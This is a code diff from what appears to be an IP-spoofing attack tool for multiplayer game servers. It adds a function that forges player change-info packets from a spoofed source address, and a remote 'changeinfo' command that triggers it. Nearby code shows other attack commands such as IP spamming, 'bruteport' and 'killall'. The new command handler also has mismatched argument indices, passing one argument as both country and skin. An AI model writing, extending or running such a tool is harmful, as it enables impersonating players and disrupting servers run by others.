@@ -556,6 +556,26 @@ void SendChat(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, c
 	SendData((const char*)buffer, BufferSize, 0);
 }
 
+void SendChangeInfo(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, char *name, char *clan = "", int country = -1, char *skin = "default", int usecustomcolor = 0, int colorbody = 65408, int colorfeet = 65408)
+{
+	if (!Create(&m_Sock[0]))
+		Close(0);
+
+	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromPort = htons(SpoofPort);
+
+	m_ToIP = inet_addr(SrvIP);
+	m_ToPort = htons(Port);
+
+	unsigned char buffer[2048];
+	int BufferSize = 0;
+	Reset(0);
+
+	ZeroMemory(buffer, sizeof(buffer));
+	BufferSize = PackChangeInfo(&buffer[0], 0, name, clan, country, skin, usecustomcolor, colorbody, colorfeet);
+	SendData((const char*)buffer, BufferSize, 0);
+}
+
 void SpamIPs(const char *IP, int Port)
 {
 	std::ifstream File("ips.txt");
@@ -1100,6 +1120,20 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				}
 				else
 					send(g_Client, "[Server]: Please use: bruteport <srvip> <srvport> <spoofip>", strlen("[Server]: Please use: bruteport <srvip> <srvport> <spoofip>"), 0);
+			}
+			else if (strcmp(aCmd[0], "changeinfo") == 0)
+			{
+				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0] && aCmd[5][0])
+				{
+					int SrvPort = atoi(aCmd[2]);
+					int Port = atoi(aCmd[4]);
+
+					SendChangeInfo(aCmd[1], SrvPort, aCmd[3], Port, aCmd[5], aCmd[6], atoi(aCmd[7]), aCmd[7], atoi(aCmd[8]), atoi(aCmd[9]), atoi(aCmd[10]));
+
+					send(g_Client, "[Server]: Spoofed change info sent successfully!", strlen("[Server]: Spoofed change info sent successfully!"), 0);
+				}
+				else
+					send(g_Client, "[Server]: Please use: changeinfo <name> {clan} {country} {skin} {usecustomcolor} {colorbody} {colorfeet}", strlen("[Server]: Please use: changeinfo <name> {clan} {country} {skin} {usecustomcolor} {colorbody} {colorfeet}"), 0);
 			}
 			else if(strcmp(aCmd[0], "killall") == 0)
 			{
